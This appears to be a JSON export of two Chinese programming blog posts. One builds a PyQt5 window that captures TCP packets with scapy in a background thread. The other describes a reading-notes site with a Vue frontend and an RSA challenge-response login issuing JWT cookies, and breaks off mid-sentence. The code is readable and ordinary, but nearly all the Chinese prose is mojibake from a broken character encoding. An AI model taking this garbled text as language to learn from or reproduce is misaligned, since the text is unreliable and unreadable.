å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªåŠŸèƒ½åªéœ€è¦è°ƒç”¨ä¸€ä¸ª sniff() å‡½æ•°ï¼Œå¹¶é…ç½®å¦‚ä¸‹å‡ ä¸ªå‚æ•°ï¼š\nprn ï¼šæŠ“åŒ…çš„å›è°ƒå‡½æ•°ã€‚æ¯æŠ“åˆ°ä¸€ä¸ªæ•°æ®åŒ…å°±ä¼šè°ƒç”¨ä¸€æ¬¡è¿™ä¸ªå‡½æ•°ï¼Œå‡½æ•°æœ‰ä¸ªé»˜è®¤å‚æ•° packet ï¼Œç±»å‹æ˜¯ scapy.packet.Packet ï¼Œæ”¯æŒå¯¹è¯¥æ•°æ®åŒ…è¿›è¡Œä¸€äº›æ“ä½œã€‚\ncount ï¼šè¦æ•æ‰çš„æ•°æ®åŒ…ä¸ªæ•°ï¼Œè®¾ç½®ä¸º 0 è¡¨ç¤ºæ— é™ã€‚\nstop_filter ï¼šç”¨äºè®¾ç½®æŠ“åŒ…åœæ­¢çš„æ¡ä»¶ï¼Œå½“å‡½æ•°è¿”å› True æ—¶åœæ­¢æŠ“åŒ…ã€‚è¿™ä¸ªå‚æ•°è·Ÿ count=0 ç®€ç›´æ˜¯ä¸å¯åˆ†å‰²çš„ï¼Œä½†ç½‘ç»œä¸Šå„æ•™ç¨‹ä¸­ä»‹ç»ä¸å¤šï¼Œå¾ˆè¿·æƒ‘ã€‚å‚æ•°å¯¹åº”çš„æ˜¯ä¸€ä¸ª å‡½æ•° ï¼Œå‡½æ•°ä¹Ÿé»˜è®¤ä¼ å…¥ packet ï¼Œè·Ÿ prn å›è°ƒå‡½æ•°çš„ç”¨æ³•åŒºåˆ«ä¸å¤§ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘å°†å…¶é…ç½®ä¸ºè¿”å›ä¸€ä¸ªæˆå‘˜å˜é‡ï¼Œå½“æˆ‘å¸Œæœ›åœæ­¢æŠ“åŒ…çš„æ—¶å€™ï¼ŒæŠŠè¿™ä¸ªæˆå‘˜å˜é‡æ”¹ä¸º True å°±è¡Œã€‚\nPyQtå’ŒScapyçš„ç»“åˆï¼šQThreadå’ŒpyqtSIgnal ç°åœ¨åˆè¦å°†æ€è·¯è·³å›PyQtä¸Šäº†ï¼Œè®°å¾—æˆ‘å¼€å‘çš„çª—å£æœ‰è¿™äº›æŒ‰é’®ï¼š\nå½“ç‚¹å‡»â€œåœ¨çº¿åˆ†æâ€œçš„æ—¶å€™ï¼Œscapyéœ€è¦å¼€å§‹æŠ“åŒ…ï¼Œä½†æŠ“åŒ…çš„å·¥ä½œä¸èƒ½å½±å“çª—å£æœ¬èº«çš„è¿è¡Œï¼Œè¿™é‡Œå°±éœ€è¦ä½¿ç”¨å¤šçº¿ç¨‹ QThread ã€‚\nä¸»çª—ä½“çš„ä»£ç å¦‚ä¸‹ï¼š\nclass Analyzer(QWidget): def __init__(self) -\u0026gt; None: super().__init__() # å®šä¹‰ç”¨äºæŠ“åŒ…çš„æˆå‘˜ self.sniffer = Sniffer() self.initUI() def initUI(self) -\u0026gt; None: # çª—ä½“ \u0026amp; æ ‡é¢˜ self.setGeometry(300, 300, 500, 400) self.setWindowTitle(\u0026#34;Traffic Analyzer\u0026#34;) # å±…ä¸­å®šä½ self.alignCenter() # è®¾ç½®æç¤ºæ¡†å­—ä½“ QToolTip.setFont(QFont(\u0026#39;HanziPen TC\u0026#39;, 10)) # å…³è”äº‹ä»¶ self.sniffer.updateSignal.connect(self.SnifferUpdate) # åˆ›å»ºæŒ‰é’® ### åœ¨çº¿åˆ†æ startBtn = QPushButton(\u0026#39;åœ¨çº¿åˆ†æ\u0026#39;, self, clicked=self.sniffer.start) startBtn.setToolTip(\u0026#39;å¯åŠ¨åœ¨çº¿æµé‡åˆ†æ\u0026#39;) startBtn.resize(startBtn.sizeHint()) ### ç»“æŸåœ¨çº¿åˆ†æ endBtn = QPushButton(\u0026#39;ç»“æŸåœ¨çº¿åˆ†æ\u0026#39;, self, clicked=self.sniffer.pause) endBtn.setToolTip(\u0026#39;ç»“æŸåœ¨çº¿æµé‡åˆ†æ\u0026#39;) endBtn.resize(endBtn.sizeHint()) ### æ‰“å¼€æ–‡ä»¶ fileBtn = QPushButton(\u0026#39;æ‰“å¼€æ–‡ä»¶\u0026#39;, self) fileBtn.setToolTip(\u0026#39;æ‰“å¼€ä¸€ä¸ªpcapæ–‡ä»¶\u0026#39;) fileBtn.clicked.connect(self.openFileDialog) fileBtn.resize(fileBtn.sizeHint()) ### æ–‡æœ¬ç¼–è¾‘ self.textEdit = QTextEdit() self.textEdit.setReadOnly(True) # è®¾ç½®å¸ƒå±€ grid = QGridLayout() self.setLayout(grid) grid.addWidget(startBtn, 0, 0) grid.addWidget(endBtn, 0, 1) grid.addWidget(fileBtn, 0, 2) grid.addWidget(self.textEdit, 2, 0, 5, 3) # å‘ˆç° self.show() \u0026#39;\u0026#39;\u0026#39; çœç•¥è‹¥å¹²ä¸é‡è¦çš„å‡½æ•° \u0026#39;\u0026#39;\u0026#39; def SnifferUpdate(self): self.textEdit.setText(self.sniffer.text) self.textEdit.moveCursor(self.textEdit.textCursor().End) ä¸Šè¿°ä»£ç çš„é‡ç‚¹åœ¨äºä¸¤ä¸ªæŒ‰é’®çš„å®šä¹‰ï¼š\nstartBtn = QPushButton(\u0026#39;åœ¨çº¿åˆ†æ\u0026#39;, self, clicked=self.sniffer.start) ... endBtn = QPushButton(\u0026#39;ç»“æŸåœ¨çº¿åˆ†æ\u0026#39;, self, clicked=self.sniffer.pause) self.sniffer æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰çš„å¯¹è±¡ï¼Œå®ƒåº”è¯¥åŸºäº QThread å®ç°å­çº¿ç¨‹ï¼ŒåŸºäº scapy å®ç°æŠ“åŒ…ï¼ŒåŸºäº pyqtSignal å®ç°ä¿¡å·ä¼ é€’ã€‚\n# ç»§æ‰¿ QThread å®ç°å­çº¿ç¨‹ class Sniffer(QThread): # ç”¨äºå‘ä¸»çª—å£ä¼ è¯´ä¿¡å· updateSignal = pyqtSignal() def __init__(self) -\u0026gt; None: super().__init__() self.pktInfo = [] self.text = \u0026#39;\u0026#39; self.stopSniff = True # é‡å†™ run å‡½æ•° def run(self): self.StartSniff() # é‡å†™ pause å‡½æ•°ä»¥åœæ­¢æŠ“åŒ… def pause(self): self.EndSniff() # åŸºäº scapy å®ç°æŠ“åŒ… def StartSniff(self): self.stopSniff = False sniff(prn=self.SniffCallBack, count=0, stop_filter=self.isStop) def isStop(self, pkt): return self.stopSniff def EndSniff(self): self.stopSniff = True def SniffCallBack(self, pkt: scapy.packet.Packet) -\u0026gt; None: if pkt.haslayer(\u0026#39;TCP\u0026#39;): infoStr = pkt.sprintf(\u0026#34;TCP -\u0026gt; %IP.src%:%TCP.sport% -\u0026gt; %IP.dst%:%TCP.dport%\u0026#34;) self.pktInfo.append(infoStr) if len(self.pktInfo) \u0026gt; 100: for i in self.pktInfo: self.text += i + \u0026#39;\\n\u0026#39; self.pktInfo.clear() # å‘ä¸»çª—å£å‘é€ä¸€ä¸ªä¿¡å· self.updateSignal.emit() åœ¨è¿™é‡Œï¼Œå®šä¹‰ SniffCallBack çš„åŠŸèƒ½ä¸ºæ•æ‰TCPæ•°æ®åŒ…ï¼Œæ¯æ•æ‰ä¸€ä¸ªåŒ…å°±äº§ç”Ÿä¸€æ¡è®°å½•ä¿¡æ¯ï¼Œæ¯æ‰æ»¡100ä¸ªåŒ… å°±å‘ä¸»çª—ä½“å‘é€ä¸€ä¸ªä¿¡å·ã€‚\nåœ¨ Analyzer ä¸­å¯¹å­è¿›ç¨‹ä¿¡å·è¿›è¡Œäº†å¤„ç†ï¼š\nself.sniffer.updateSignal.connect(self.SnifferUpdate) ... def SnifferUpdate(self): self.textEdit.setText(self.sniffer.text) self.textEdit.moveCursor(self.textEdit.textCursor().End) æ”¶åˆ°ä¿¡å·æ—¶ï¼Œä¸»çª—ä½“ä» Sniffer å½“ä¸­å–å‡ºç°æœ‰çš„æ‰€æœ‰æ•°æ®åŒ…çš„ä¿¡æ¯ï¼Œæ˜¾ç¤ºåˆ°æ–‡æœ¬æ¡†ä¸Šï¼Œå¹¶å°†æ–‡æœ¬æ¡†æ»šåŠ¨æ¡æ»‘è‡³åº•éƒ¨ã€‚\næ€»çš„ä»£ç å¦‚ä¸‹ï¼š\nfrom struct import pack import sys from telnetlib import NOP from turtle import left from PyQt5.QtWidgets import (QApplication, QGridLayout, QToolTip, QPushButton, QMessageBox, QDesktopWidget, QWidget, QTextEdit, QFileDialog) from PyQt5.QtGui import QFont from PyQt5.QtCore import Qt, pyqtSignal, QThread from scapy.all import * class Sniffer(QThread): updateSignal = pyqtSignal() def __init__(self) -\u0026gt; None: super().__init__() self.pktInfo = [] self.text = \u0026#39;\u0026#39; self.stopSniff = True def run(self): self.StartSniff() def pause(self): self.EndSniff() def StartSniff(self): self.stopSniff = False sniff(prn=self.SniffCallBack, count=0, stop_filter=self.isStop) def isStop(self, pkt): return self.stopSniff def EndSniff(self): self.stopSniff = True def SniffCallBack(self, pkt: scapy.packet.Packet) -\u0026gt; None: if pkt.haslayer(\u0026#39;TCP\u0026#39;): infoStr = pkt.sprintf(\u0026#34;TCP -\u0026gt; %IP.src%:%TCP.sport% -\u0026gt; %IP.dst%:%TCP.dport%\u0026#34;) self.pktInfo.append(infoStr) # print(infoStr + \u0026#39;\\t\u0026#39; + str(len(self.pktInfo))) if len(self.pktInfo) \u0026gt; 100: for i in self.pktInfo: self.text += i + \u0026#39;\\n\u0026#39; self.pktInfo.clear() self.updateSignal.emit() class Analyzer(QWidget): def __init__(self) -\u0026gt; None: super().__init__() self.sniffer = Sniffer() self.initUI() def initUI(self) -\u0026gt; None: # çª—ä½“ \u0026amp; æ ‡é¢˜ self.setGeometry(300, 300, 500, 400) self.setWindowTitle(\u0026#34;Traffic Analyzer\u0026#34;) # çŠ¶æ€æ ï¼ˆçˆ¶ç±» QMainWindow ä¸æ …æ ¼å¸ƒå±€å†²çªï¼‰ # self.statusBar().showMessage(\u0026#34;å°±ç»ª\u0026#34;) # å±…ä¸­å®šä½ self.alignCenter() # è®¾ç½®æç¤ºæ¡†å­—ä½“ QToolTip.setFont(QFont(\u0026#39;HanziPen TC\u0026#39;, 10)) # å…³è”äº‹ä»¶ self.sniffer.updateSignal.connect(self.SnifferUpdate) # åˆ›å»ºæŒ‰é’® ### åœ¨çº¿åˆ†æ startBtn = QPushButton(\u0026#39;åœ¨çº¿åˆ†æ\u0026#39;, self, clicked=self.sniffer.start) startBtn.setToolTip(\u0026#39;å¯åŠ¨åœ¨çº¿æµé‡åˆ†æ\u0026#39;) startBtn.resize(startBtn.sizeHint()) ### ç»“æŸåœ¨çº¿åˆ†æ endBtn = QPushButton(\u0026#39;ç»“æŸåœ¨çº¿åˆ†æ\u0026#39;, self, clicked=self.sniffer.pause) endBtn.setToolTip(\u0026#39;ç»“æŸåœ¨çº¿æµé‡åˆ†æ\u0026#39;) endBtn.resize(endBtn.sizeHint()) ### æ‰“å¼€æ–‡ä»¶ fileBtn = QPushButton(\u0026#39;æ‰“å¼€æ–‡ä»¶\u0026#39;, self) fileBtn.setToolTip(\u0026#39;æ‰“å¼€ä¸€ä¸ªpcapæ–‡ä»¶\u0026#39;) fileBtn.clicked.connect(self.openFileDialog) fileBtn.resize(fileBtn.sizeHint()) ### æ–‡æœ¬ç¼–è¾‘ self.textEdit = QTextEdit() self.textEdit.setReadOnly(True) # è®¾ç½®å¸ƒå±€ grid = QGridLayout() self.setLayout(grid) grid.addWidget(startBtn, 0, 0) grid.addWidget(endBtn, 0, 1) grid.addWidget(fileBtn, 0, 2) grid.addWidget(self.textEdit, 2, 0, 5, 3) # å‘ˆç° self.show() def closeEvent(self, event) -\u0026gt; None: reply = QMessageBox.question(self, \u0026#39;å…³é—­ç¨‹åº\u0026#39;, \u0026#39;ç¡®å®šå…³é—­ç¨‹åºï¼Ÿ\u0026#39;, QMessageBox.Yes | QMessageBox.No, QMessageBox.No) if reply == QMessageBox.Yes: event.accept() else: event.ignore() def alignCenter(self) -\u0026gt; None: qr = self.frameGeometry() cp = QDesktopWidget().availableGeometry().center() qr.moveCenter(cp) self.move(qr.topLeft()) def keyPressEvent(self, e) -\u0026gt; None: if e.key() == Qt.Key_Escape: self.close() def openFileDialog(self): fname = QFileDialog.getOpenFileName(self, \u0026#39;æ‰“å¼€æ–‡ä»¶\u0026#39;, \u0026#39;~/\u0026#39;, filter=\u0026#39;*.py\u0026#39;) if fname[0]: f = open(fname[0], \u0026#39;r\u0026#39;) with f: data = f.read() self.textEdit.setText(data) def SnifferUpdate(self): self.textEdit.setText(self.sniffer.text) self.textEdit.moveCursor(self.textEdit.textCursor().End) if __name__ == \u0026#39;__main__\u0026#39;: app = QApplication(sys.argv) analyzer = Analyzer() sys.exit(app.exec_()) åè®° åˆæ¢PyQtå’ŒScapyï¼Œè‡ªè§‰æœ¬æ–‡å†™å¾—æ‚ä¹±ï¼Œä»…åšè‡ªå¨±ã€‚ä»£ç ä¹Ÿè®¸è¿˜æœ‰ä¸€äº›å‚è€ƒä»·å€¼ï¼Œè¯·è¯»è€…è‡ªè¡Œæ–Ÿé…Œç½¢ã€‚\n","date":"2022-04-10T00:00:00Z","permalink":"https://xrg.fj.cn/p/pyqt5%E5%88%9D%E6%8E%A2%E4%B8%8Escapy%E7%9A%84%E7%BE%8E%E5%A6%99%E7%BB%93%E5%90%88/","title":"PyQt5åˆæ¢â€”â€”ä¸scapyçš„ç¾å¦™ç»“åˆ"},{"content":"è‡ªåç«¯ç¯‡ä¹‹åï¼Œå„æ–¹é¢è¿›åº¦é€æ¸åŠ å¿«ï¼Œä»¥è‡³äºåŸºæœ¬æ²¡æœ‰æ—¶é—´æ…¢æ…¢è·Ÿè¿›è®°å½•äº†ã€‚\nç›®å‰ç«™ç‚¹å·²ç»ä¸Šçº¿ https://119.45.233.104/ ï¼Œç›´æ¥è®¿é—®ä¼šæ˜¾ç¤ºè¯ä¹¦ä¸å®‰å…¨ï¼Œå¿½ç•¥å®‰å…¨è­¦å‘Šå³å¯ï¼ˆè¯ä¹¦å®Œå…¨åˆæ³•ï¼Œäº§ç”Ÿè­¦å‘Šæ˜¯å› ä¸ºè¯ä¹¦æ˜¯è·ŸåŸŸåç»‘å®šçš„ï¼‰ã€‚å…¶å®åŸŸåä¹Ÿå·²ç»æå®šäº†ï¼Œä½†æ˜¯è§£æåˆ°å›½å†…IPçš„åŸŸåéœ€è¦å¤‡æ¡ˆï¼Œè¿‡ä¸€é˜µå­å†è¯´å§ï½\næœ¬ç¯‡ä¸»è¦æ˜¯è¿›è¡Œä¸€ä¸ªæ”¶å°¾æ€»ç»“å·¥ä½œï¼Œé™¤éä¹‹åæœ‰è¾ƒå¤§æ”¹åŠ¨ï¼Œå¦åˆ™å¯¹äºè¯»ä¹¦æ‘˜æŠ„ç«™ç‚¹çš„å™è¿°å°±åˆ°æ­¤ä¸ºæ­¢äº†ï¼Œæ€»å…±ä¸‰ç¯‡ï¼Œäº‹ä¸è¿‡ä¸‰å˜›ï¼\n0x00 åç«¯å¼€å‘ç¯å¢ƒè½¬ç§» åç«¯å¼€å‘ç¯å¢ƒå·²ç”±ä¸Šä¸€ç¯‡æ‰€è¿°çš„ Windows+VisualStudio æ”¹æ¢åˆ° CentOS 7+VSCodeè¿œç¨‹å¼€å‘ ï¼Œå¼•å‘è¿™ä¸ªå†³å®šçš„å› ç´ ä¸»è¦æœ‰å‡ ç‚¹ï¼š\nVisualStudio å¯¹ CMake é¡¹ç›®ä¸å¤ªå‹å¥½ï¼Œè‡ªåŠ¨æ·»åŠ è‹¥å¹²ç¼–è¯‘é€‰é¡¹ï¼Œè¿˜æœ‰å„ç§Cacheï¼Œæ¯æ¬¡ç¼–è¯‘éƒ½è¦é¢ä¸´å„ç§ä¾èµ–é—®é¢˜ï¼Œå¾ˆçƒ¦ï¼›\nVCPKG å®‰è£…çš„ä¾èµ–å­˜åœ¨å¤§å¤§å°å°çš„é—®é¢˜ï¼ŒæŠ˜è…¾äº†è‹¥å¹²æ¬¡ç¯å¢ƒå˜é‡ï¼Œæˆ‘æ„è¯†åˆ°æ ¹æœ¬æ²¡å¿…è¦åœ¨è¿™æ–¹é¢ç»§ç»­æµªè´¹æ—¶é—´äº†ï¼›\nå¯¼ç«ç´¢ï¼šæ ¹é¡µé¢çš„æ§åˆ¶å™¨ IndexCtrl éƒ½å·²ç»å†™å®Œäº†ï¼Œåœ¨å°è¯•è”é€šMySQLçš„æ—¶å€™æŠ¥é”™æ‰¾ä¸åˆ°æ•°æ®åº“ï¼Œç›´æ¥ç‚¸è£‚ï¼Œæ€’è€Œå¼ƒå‘ã€‚\nè¿˜æ˜¯ä¾ç…§ Drogon WiKi åœ¨ CentOS 7 ä¸Šé…å¥½äº†ç¯å¢ƒï¼Œæ²¡å‡ºç°ä»»ä½•é—®é¢˜ï¼Œä¸å¾—ä¸æœæ°”ã€‚\nåœ¨ Windows/MacOS ä¸Šéƒ½å¯ä»¥å®‰è£…VSCodeï¼Œä¸‹è½½ RemoteDevelopment æ’ä»¶å³å¯é…ç½®è¿œç¨‹å¼€å‘ï¼Œç½‘ä¸Šæ•™ç¨‹å¾ˆå¤šï¼Œæ­¤å¤„ä¸è¡¨ã€‚\n0x01 å‰ç«¯å¼•å…¥VUE åœ¨å‰åç«¯ç»“åˆçš„æ—¶å€™ï¼Œå‡ºç°äº†ä¸€ä¸ªè¶…çº§éš¾å—çš„æƒ…å†µï¼šDrogonè‡ªå¸¦çš„é¡µé¢æ¸²æŸ“æœºåˆ¶CSPå‡ºç°äº†ä¸­æ–‡ä¹±ç çš„é—®é¢˜ã€‚è¿™ä¸ªé—®é¢˜ä¸æ˜¯Drogonçš„é—®é¢˜ï¼Œè€Œåº”è¯¥æ˜¯æˆ‘åœ¨é…ç½®ç¼–ç ä¸Šå­˜åœ¨ä¸€äº›çº°æ¼ï¼Œä½†æ˜¯ æˆ‘ä¸æƒ³æ‰¿è®¤æˆ‘çš„é—®é¢˜ æˆ‘ä¸æƒ³èŠ±æ—¶é—´å»è°ƒè¯•è¿™ä¸€éä¸»æµçš„æŠ€æœ¯ï¼Œè€Œä¸”æˆ‘ä¸€ç›´æ‹…å¿ƒæˆ‘çš„å°ç ´æœåŠ¡å™¨åƒä¸æ¶ˆåç«¯æ¸²æŸ“ï¼Œå› æ­¤å†³å®šå°è¯•ä¸€ä¸‹æ­¤å‰ä»æœªæè¿‡çš„å‰ç«¯æ¸²æŸ“ã€‚\nå‰åç«¯æ¸²æŸ“çš„åŒºåˆ«ä¸»è¦åœ¨äºæœ€ç»ˆé¡µé¢æ˜¯åœ¨å“ªé‡Œç”Ÿæˆçš„ã€‚åç«¯æ¸²æŸ“æ˜¯åœ¨æœåŠ¡ç«¯ç”Ÿæˆæˆ‘ä»¬æœ€ç»ˆçœ‹åˆ°çš„é¡µé¢ï¼Œè€Œå‰ç«¯æ¸²æŸ“ä¸»è¦æ˜¯ç”±æµè§ˆå™¨ç”Ÿæˆæˆ‘ä»¬æœ€ç»ˆçœ‹åˆ°çš„é¡µé¢ã€‚å‰ç«¯æ¸²æŸ“çš„å¥½å¤„æ˜¯å‰åç«¯è¿é€šçš„æ—¶å€™åªéœ€è¦ä¼ è¾“ä¸€äº›ç®€å•çš„æ•°æ®å³å¯ï¼Œè€Œä¸”ç”±äºâ€œåœ¨å‰ç«¯æ¸²æŸ“â€è¿™ä¸€ç‰¹æ€§ï¼Œå®ç°ä¸€äº›å¼‚æ­¥åŠŸèƒ½çš„æ—¶å€™æ›´åŠ ç®€å•ï¼ˆå¦‚åˆ†æ®µåŠ è½½ï¼‰ã€‚\nVUE æ˜¯ä¸€ä¸ªå‰ç«¯æ¸²æŸ“æ¡†æ¶ï¼Œåªéœ€æŒ‰ç…§ç»™å®šçš„è¯­æ³•ï¼Œæä¾›ç‰¹å®šçš„æ•°æ®ï¼ˆä¾‹å¦‚ä½¿ç”¨Ajaxä»æœåŠ¡ç«¯è¯·æ±‚ï¼‰ï¼Œå°±å¯ä»¥å®ç°å‰ç«¯æ¸²æŸ“ã€‚\nç°æœ‰çš„VUEé¡¹ç›®è§„æ¨¡éƒ½æ¯”è¾ƒå¤§ï¼Œç”¨åˆ°äº†ä¸€äº›é«˜çº§ç‰¹æ€§ï¼Œå¦‚å•æ–‡ä»¶ç»„ä»¶ç­‰ï¼›æˆ‘çš„è¯»ä¹¦æ‘˜æŠ„ç«™ç‚¹æ»¡æ‰“æ»¡ç®—ä¸€å…±ä¸‰å››ä¸ªé¡µé¢ï¼Œä¸æ€ä¹ˆå­˜åœ¨ç»„ä»¶å¤ç”¨ç­‰æƒ…å†µï¼Œå› æ­¤æˆ‘ç›´æ¥å°†æ¯ä¸ªæ–‡ä»¶éƒ½ç»‘å®šä¸€ä¸ªVUE APPï¼Œå„è‡ªå®ç°å…¶åŠŸèƒ½ã€‚å¯¹äºVUEæ¥è¯´ï¼Œä¸»è¦åªç”¨åˆ°å®ƒçš„å®æ—¶æ¸²æŸ“çš„ç‰¹æ€§è€Œå·²ã€‚\nå‰ç«¯å¼•å…¥VUEä¹‹åï¼Œäº¤äº’å°±å˜å¾—æ¯”è¾ƒç®€å•ã€‚ç›®å‰è¿˜æ²¡æœ‰å®ç°åˆ†æ®µåŠ è½½çš„åŠŸèƒ½ï¼Œå› æ­¤ç›´æ¥åœ¨é¡µé¢åŠ è½½çš„æ—¶å€™ä»åç«¯è·å–æ‰€æœ‰æ•°æ®ã€‚åœ¨VUEä¸­å®šä¹‰ä¸€ä¸ª fetchData() çš„æ–¹æ³•ï¼Œå…¶ä¸­ä½¿ç”¨ axios ä»åç«¯è¯·æ±‚æ•°æ®ï¼Œç„¶åæ›´æ–°åˆ°å®ä¾‹çš„ data ä¸Šï¼›è¿™ä¸ªæ–¹æ³•åœ¨ mounted() çš„æ—¶å€™è¢«è°ƒç”¨ã€‚éœ€è¦æ³¨æ„ï¼Œåœ¨ fetchData() é‡Œé¢ä½¿ç”¨çš„ this æŒ‡å‘çš„ä¸æ˜¯ç»„ä»¶å®ä¾‹ï¼Œè¦ä»å¤–éƒ¨ä¼ å…¥å®ä¾‹æ‰è¡Œã€‚\nconst app = Vue.createApp({ // ==== ç•¥ ==== methods: { // ==== ç•¥ ==== fetchData(vueThis) { axios .get(\u0026#39;/index\u0026#39;) .then(function (response) { var respJSON = JSON.parse(JSON.stringify(response.data)); vueThis.login = respJSON[\u0026#34;login\u0026#34;]; vueThis.cards = respJSON[\u0026#34;cards\u0026#34;]; vueThis.totalBooks = respJSON[\u0026#34;totalBooks\u0026#34;]; }) .catch(function (error) { console.log(error); }); } }, mounted() { let vueThis = this; this.fetchData(vueThis); } }).mount(\u0026#39;#app\u0026#39;) 0x02 äº¤äº’é€»è¾‘è®¾è®¡ æ€»ä½“äº¤äº’é€»è¾‘ æ•´ä¸ªç«™ç‚¹çš„äº¤äº’é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œæ— è®ºæ˜¯å¦ç™»å½•éƒ½èƒ½æŸ¥çœ‹æˆ‘çš„æ‘˜æŠ„å†…å®¹ã€‚ç™»å½•çš„ä½œç”¨ç›®å‰ä»…é™äºå‘å¸ƒæ‘˜æŠ„ï¼ˆå°†æ¥æœ‰å¤šäººä½¿ç”¨è¯¥ç«™ç‚¹çš„æ—¶å€™å¯ä»¥æ­£å¼åŠ å…¥ç”¨æˆ·åŠŸèƒ½ï¼‰ã€‚\nä¸ªäººè®¤ä¸ºç™»å½•è®¤è¯çš„æ¨¡å—åšå¾—è¿˜ä¸é”™ï¼Œå®é™…ä¸Šä¹Ÿæ˜¯æœ¬ç«™å·¥ä½œé‡çš„é›†ä¸­ä½“ç°ï¼Œåç»­è¯¦è°ˆã€‚\n0x03 ç™»å½•è®¤è¯ æœ¬ç«™ç™»å½•è®¤è¯æœºåˆ¶æ˜¯ å…¬ç§é’¥è®¤è¯ ï¼Œå®ç°æ€è·¯å¦‚ä¸‹ï¼š\nç™»å½•è®¤è¯æœºåˆ¶ ç”¨æˆ·å‘æœåŠ¡å™¨å‘èµ·ç™»å½•è¯·æ±‚ï¼Œæºå¸¦å‚æ•° user=xxx ï¼›\næœåŠ¡å™¨æ ¹æ®ç”¨æˆ·åæ‰¾åˆ°è¯¥ç”¨æˆ·çš„å…¬é’¥ï¼ˆå·²ç»é¢„å…ˆä¿å­˜å¥½ï¼‰ï¼Œç”Ÿæˆéšæœºå­—ç¬¦ä¸² s ï¼Œä¿å­˜ user-s è¿™ä¸€æ˜ å°„å…³ç³»ï¼›ç”¨å…¬é’¥åŠ å¯† s å¾—åˆ°åŠ å¯†åçš„å­—ç¬¦ä¸² question ï¼Œè¯¥åŠ å¯†ä¸²è¿˜éœ€è¦ä½¿ç”¨Base64ç¼–ç ï¼Œç„¶åä¼ è¾“åˆ°å‰ç«¯ï¼›\nå‰ç«¯è„šæœ¬å¾—åˆ° question ï¼Œä½¿ç”¨ç”¨æˆ·è¾“å…¥åˆ°æ–‡æœ¬æ¡†çš„ç§é’¥å¯¹å…¶è¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°è§£å¯†åçš„å­—ç¬¦ä¸² answer ï¼Œè¿”å›ç»™æœåŠ¡å™¨ï¼Œå‚æ•°ä¸º user=xxx;answer=xxxxx ï¼›\næœåŠ¡ç«¯æ”¶åˆ° answer ï¼Œå°†å…¶ä¸ s è¿›è¡Œå¯¹æ¯”ï¼›\nç™»å½•æˆåŠŸï¼šæœåŠ¡ç«¯ç”ŸæˆJWTï¼ˆJson Web Tokenï¼‰ï¼Œè¿”å›å‰ç«¯å‘ŠçŸ¥ç™»å½•æˆåŠŸï¼›\nç™»å½•å¤±è´¥ï¼šè¿”å›å‰ç«¯å‘ŠçŸ¥ç™»å½•å¤±è´¥ã€‚\nç™»å½•æˆåŠŸä¹‹åå‰ç«¯ä¼šè·å–ä¸€ä¸ªJWTï¼Œå°†å…¶ä¿å­˜åˆ°cookieï¼›\næ­¤åæ‰€æœ‰è¯·æ±‚éƒ½ä¼šå¸¦ä¸ŠJWTï¼Œåç«¯è·å–JWTè¿›è¡ŒéªŒè¯å³å¯åˆ¤æ–­ç”¨æˆ·çš„ç™»å½•çŠ¶æ€ã€‚\nè¿™ä¸ªç™»å½•æœºåˆ¶çš„å®‰å…¨åˆ†æå¦‚ä¸‹ï¼š\næ¯ä¸ªç”¨æˆ·å¯¹åº”çš„å…¬ç§é’¥éƒ½æ˜¯å”¯ä¸€çš„ï¼Œä½¿ç”¨ç”¨æˆ·å…¬é’¥åŠ å¯†çš„éšæœºä¸²ï¼Œåªæœ‰æ‹¥æœ‰ç§é’¥çš„ç”¨æˆ·æ‰èƒ½è§£å¯†ï¼Œå› æ­¤ï¼Œç”¨æˆ·çš„èº«ä»½å¯ä»¥å¾—åˆ°ç¡®è®¤ï¼›\nç”¨æˆ·ç§é’¥åªç”¨äºæµè§ˆå™¨ç«¯è§£å¯†ï¼Œä¸ä¼ è¾“åˆ°ç½‘ç»œä¸Šï¼Œå› æ­¤ç§é’¥ç§å¯†æ€§å¯ä»¥ä¿è¯ï¼›\nç™»å½•æˆåŠŸä¹‹åè·å–çš„JWTï¼Œæ ‡å‡†çš„å®ç°åŠæ³•åº”è¯¥æ˜¯å°†å…¶å­˜æ”¾åˆ° local storage ï¼Œä½†è¿™é‡Œç›´æ¥å­˜åˆ°cookieï¼Œä¸»è¦æ˜¯åŸºäºå®ç°éš¾åº¦è¿›è¡Œçš„é€‰æ‹©ï¼›\ncookieéœ€è¦é’ˆå¯¹CSRFæ”»å‡»è¿›è¡Œä¸€ç³»åˆ—åŠ å›ºï¼ˆHTTP onlyç­‰ï¼‰ï¼›\nç®€å•è®°å½•ä¸€ä¸‹è¿™ä¸ªç™»å½•æœºåˆ¶çš„å®ç°æ–¹æ¡ˆï¼š\nåå°C++ä½¿ç”¨opensslå®ç°çš„RSAå…¬é’¥åŠ å¯†ï¼Œæ”¯æŒçš„å…¬é’¥æ ¼å¼åº”ä»¥ BEGIN PUBLIC KEY å¼€å¤´ï¼›\n#include \u0026lt;drogon/utils/Utilities.h\u0026gt; å¹¶ä½¿ç”¨ utils::base64Encode è¿™ä¸ªDrogon APIæ¥è¿›è¡ŒBase64ç¼–ç ï¼›\nå¼•å…¥ CPP-JWT è¿™ä¸ªç¬¬ä¸‰æ–¹åº“æ¥å®ç°JWTçš„ç”Ÿæˆå’Œè§£æï¼›\nå‰ç«¯ä½¿ç”¨ JSEncrypt æ¥å®ç°RSAç§é’¥è§£å¯†ï¼›\nJWTå’Œcookieéƒ½è®¾ç½®è¿‡æœŸæ—¶é—´ï¼ˆæš‚å®š1å¤©ï¼‰ã€‚\nè¿™ä¸ªæ–¹æ¡ˆå…¶å®è¿›è¡Œäº†ä¸€äº›å–èˆï¼š\nJWTå­˜åˆ°cookieï¼Œæ˜¯ä¸€ç§å¦¥åã€‚æ ‡å‡†çš„åšæ³•æ˜¯å®ç° æœ¬åœ°å­˜å‚¨ ï¼Œç„¶åæ¯æ¬¡è¿›è¡Œè¯·æ±‚æ—¶éƒ½ä»æœ¬åœ°è·å–JWTå¹¶æ”¾å…¥è¯·æ±‚å¤´ï¼ˆå¦‚axiosè®¾ç½®æ‹¦æˆªå™¨ï¼‰ã€‚ä½†æ˜¯ï¼Œæˆ‘çš„é¡µé¢ä¸­å¹¶ä¸æ˜¯æ‰€æœ‰çš„è¯·æ±‚éƒ½æ˜¯ç”±æˆ‘æ§åˆ¶çš„ï¼Œå³å¹¶ä¸æ˜¯æ‰€æœ‰è¯·æ±‚éƒ½æ˜¯ç”±Ajaxä»£ç 